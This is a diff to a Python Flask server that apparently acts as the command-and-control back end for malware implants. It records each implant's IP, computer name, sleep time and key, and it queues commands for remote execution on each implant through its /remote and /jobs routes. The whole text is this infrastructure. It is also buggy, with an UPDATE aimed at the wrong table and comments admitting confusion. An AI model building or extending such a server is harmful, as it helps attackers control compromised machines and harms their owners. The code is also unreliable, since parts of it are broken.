@@ -41,7 +41,7 @@ def addImplant(data):
         connection.commit()
 
     elif (len(results) == 1):
-        print("I lowkey don't know what we change everytime we checkIn after the first time, so this text is a placeholder")
+        return ("I lowkey don't know what we change everytime we checkIn after the first time, so this text is a placeholder")
 
         # parsedData = [data["authorize_code"], makeId(), str(
         #     datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"]]
@@ -50,9 +50,10 @@ def addImplant(data):
         #                 VALUES (?, ?, 34, ?, ?, ?, ?, ?)', parsedData)
         # connection.commit()
     else:
-        print("Error, Implant already recorded at indexes:", results)
+        return("Error, Implant already recorded at indexes:", results)
 
     connection.close()
+    return ("Successfully added to database")
 
 
 @ app.route("/sqlcheck")
@@ -81,7 +82,7 @@ def check():
         # raw data function d = request.get_data()
         print("test")
         data = request.data.decode("utf-8")
-        print(type(json.loads(data)))
+        #print(type(json.loads(data)))
         data=json.loads(data)
         data["IP"] = request.remote_addr
         addImplant(data)
@@ -98,24 +99,24 @@ def jason():
 
 @ app.route("/remote", methods=['POST', 'GET'])
 def cmds():
-    data = request.get_data()
+    data = json.loads(request.get_data())
     ip = data["IP"]
     cmds = data["cmds"]
-    
     connection = sqlite3.connect("./data/real.db")
     cursor = connection.cursor()
     ans =[x for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip])]
     if len(ans)==0:
-        print("That IP is not in the table")
+        return ("That IP is not in the table, commands won't be executed")
     elif len(ans)==1:
         prevCmd = np.array(ans[0])
         fullCmd = str(np.concatenate((prevCmd, cmds)).tolist())
         cursor.execute("UPDATE cmdQ SET cmdQ = ? WHERE IP = ?", [(fullCmd, ip)])
+        connection.close()
+        return ("Commands have been placed in queue")
     else:
-        print("multiple same Ips found")
-    connection.close()
+        return ("multiple same Ips found, commands won't be executed")
+
     
-    return data
 
 @ app.route("/jobs", methods=['POST', 'GET'])
 def getJobs():
